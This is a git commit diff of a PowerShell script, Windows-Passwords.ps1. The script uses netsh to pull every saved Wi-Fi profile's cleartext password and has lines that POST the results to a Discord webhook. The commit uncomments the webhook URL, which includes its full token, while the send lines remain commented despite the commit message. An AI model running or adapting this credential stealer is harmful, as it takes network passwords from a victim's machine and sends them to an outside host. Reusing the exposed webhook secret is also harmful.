0dd14416b23ab9eb1773ea61e2cab5e32c5dc0b0
Javi Rufo <150443755+javirufo-ies@users.noreply.github.com>
2025-12-10 08:53:48 +0100

    Uncomment Discord webhook and output lines

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -1,4 +1,4 @@
-#$discord = "https://discord.com/api/webhooks/1447492875704205362/VyqK99hc7pwqsloWyBulkjPktt7zdS6QqDLeaUyovN4pFrWMsBD3fP2ue0ubyBYMNGms"
+$discord = "https://discord.com/api/webhooks/1447492875704205362/VyqK99hc7pwqsloWyBulkjPktt7zdS6QqDLeaUyovN4pFrWMsBD3fP2ue0ubyBYMNGms"
 netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+' 
@@ -9,8 +9,11 @@ netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s)
 	}
 	
 	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+
 	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) > salida.txt
-	#Write-Output $Body 
+	
+	# Write-Output $Body 
+	
 
 }
 
